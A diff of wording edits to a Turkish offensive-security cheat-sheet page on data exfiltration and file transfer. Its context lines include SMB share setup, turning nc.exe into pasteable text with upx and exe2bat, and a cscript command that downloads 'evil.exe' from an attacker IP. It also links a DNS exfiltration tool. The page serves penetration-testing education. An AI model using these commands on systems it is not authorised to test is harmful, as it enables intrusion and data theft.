@@ -4,7 +4,7 @@
 
 ## Bilgi sızdırmak için yaygın olarak beyaz listeye alınmış alanlar
 
-Sıkça beyaz listeye alınmış ve kötüye kullanılabilecek alanları bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin.
+Sıkça kötüye kullanılabilecek beyaz listeye alınmış alanları bulmak için [https://lots-project.com/](https://lots-project.com/) adresini kontrol edin.
 
 ## Copy\&Paste Base64
 
@@ -150,7 +150,7 @@ kali_op2> smbserver.py -smb2support name /path/folder # Share a folder
 #For new Win10 versions
 impacket-smbserver -smb2support -user test -password test test `pwd`
 ```
-Veya **samba** kullanarak bir smb paylaşımı oluşturun:
+Ya da **samba** kullanarak bir smb paylaşımı oluşturun:
 ```bash
 apt-get install samba
 mkdir /tmp/smb
@@ -296,14 +296,18 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-`debug.exe` programı yalnızca ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **hex'ten yeniden inşa etme yeteneğine de sahiptir**. Bu, bir ikilinin hex'ini sağlayarak, `debug.exe`'nin ikili dosyayı oluşturabileceği anlamına gelir. Ancak, debug.exe'nin **64 kb boyutuna kadar dosyaları birleştirme sınırlaması** olduğunu belirtmek önemlidir.
+`debug.exe` programı yalnızca ikili dosyaların incelenmesine izin vermekle kalmaz, aynı zamanda **hex'ten yeniden inşa etme yeteneğine de sahiptir**. Bu, bir ikilinin hex'ini sağlayarak, `debug.exe`'nin ikili dosya oluşturabileceği anlamına gelir. Ancak, debug.exe'nin **64 kb boyutuna kadar dosyaları birleştirme sınırlaması** olduğunu belirtmek önemlidir.
 ```bash
 # Reduce the size
 upx -9 nc.exe
 wine exe2bat.exe nc.exe nc.txt
 ```
-Sonra metni windows-shell'e kopyalayıp yapıştırın ve nc.exe adında bir dosya oluşturulacaktır.
+Sonra metni windows-shell'e kopyala-yapıştır yap ve nc.exe adında bir dosya oluşturulacak.
+
+- [https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html](https://chryzsh.gitbooks.io/pentestbook/content/transfering_files_to_windows.html)
 
 ## DNS
+
+- [https://github.com/Stratiz/DNS-Exfil](https://github.com/Stratiz/DNS-Exfil)
 
 {{#include ../banners/hacktricks-training.md}}
